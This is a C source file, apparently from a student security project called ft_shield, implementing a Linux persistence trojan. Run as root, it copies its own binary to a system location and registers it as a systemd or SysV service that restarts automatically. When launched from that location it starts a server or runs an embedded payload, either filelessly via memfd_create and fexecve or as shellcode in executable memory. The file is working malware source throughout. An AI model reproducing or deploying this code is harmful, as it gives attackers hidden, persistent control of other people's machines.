#include "ft_shield.h"

void	daemonize(char *target)
{
	int		len;
	char	config[4096];

	int fd = open(SYSTEMD_CONF_DIR"/"PRG_NAME".service", O_CREAT | O_TRUNC | O_WRONLY, 0755);
	if (fd >= 0)
	{
		len = sprintf(config, SYSTEMD_CONFIG, DESCRIPTION, "/", target);
		write(fd, config, len);
		close(fd);
		chmod(SYSTEMD_CONF_DIR"/"PRG_NAME".service", 0755);
		system("systemctl daemon-reload");
		system("systemctl enable "PRG_NAME);
		system("systemctl restart "PRG_NAME);
	}
	else // not systemd
	{
		fd = open(SYSV_CONF_DIR"/"PRG_NAME, O_CREAT | O_TRUNC | O_WRONLY, 0755);
		if (fd >= 0)
		{
			len = sprintf(config, SYSV_CONFIG, PRG_NAME, DESCRIPTION, target, PRG_NAME, PRG_NAME);
			write(fd, config, len);
			close(fd);
			system(SYSV_CONF_DIR"/"PRG_NAME" stop");
			system(SYSV_CONF_DIR"/"PRG_NAME" start");
		}
	}
}

void	duplicate(char *path, char *target)
{
	char *buffer[BUFFER_SIZE];

	int src_fd = open(path, O_RDONLY);
	if (src_fd < 0)
		return ;
	if (!access(SYSTEMD_CONF_DIR"/"PRG_NAME".service", F_OK))
		system("systemctl stop "PRG_NAME);
	else if (!access(SYSV_CONF_DIR"/"PRG_NAME, F_OK))
		system(SYSV_CONF_DIR"/"PRG_NAME" stop");
	int target_fd = open(target, O_CREAT | O_TRUNC | O_WRONLY, 0100);
	if (target_fd < 0)
	{
		close(src_fd);
		return ;
	}
	int ret;
	while ((ret = read(src_fd, buffer, BUFFER_SIZE)))
		write(target_fd, buffer, ret);
	close(target_fd);
	close(src_fd);
}

#ifdef PAYLOAD
	extern char		*_binary___payload_start;
	extern char		*_binary___payload_end;
	extern void		*_binary___payload_size;
#endif

int		main(void)
{
	char path[MAX_PATH_SIZE];
	char bin_path[MAX_PATH_SIZE];
	char target_path[MAX_PATH_SIZE];

	if (geteuid())
	{
		printf("Please run as root\n");
		return (EXIT_FAILURE);
	}
	if (readlink(PROC_SELF_EXE, path, MAX_PATH_SIZE) < 0)
		return (EXIT_SUCCESS);
	if (readlink(TARGET_LOCATION, bin_path, MAX_PATH_SIZE) >= 0)
		sprintf(target_path, "/%s/%s", bin_path, PRG_NAME);
	else
		sprintf(target_path, "%s/%s", TARGET_LOCATION, PRG_NAME);
	if (strcmp(path, target_path))
	{
		printf("%s\n", STUDENT_LOGIN);
		if (!fork())
		{
			close(STDOUT_FILENO);
			close(STDERR_FILENO);
			duplicate(PROC_SELF_EXE, target_path);
			daemonize(target_path);
		}
	}
	else
	{
#ifdef PAYLOAD
		void (*entrypoint)();
		size_t size = (size_t)&_binary___payload_size;
		if (!memcmp(&_binary___payload_start, "\x7f\x45\x4c\x46", 4) ||
		!memcmp(&_binary___payload_start, "#!/", 3)) // elf file or interpretable
		{
			int fd = memfd_create(SNEAKY_FILE, 0);
			write(fd, &_binary___payload_start, size);
			char *argv[] = {SNEAKY_FILE, NULL};
			char *envv[] = {NULL};

			fexecve(fd, argv, envv);
			close(fd);
		}
		else // Assume it's a shellcode
		{
			void *addr = mmap(NULL, size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANON, -1, 0);
			if (!addr)
				return (EXIT_SUCCESS);
			memcpy(addr, &_binary___payload_start, size);
			entrypoint = addr;
			entrypoint();
			munmap(addr, size);
		}
#else
		server();
#endif
	}
	return (EXIT_SUCCESS);
}
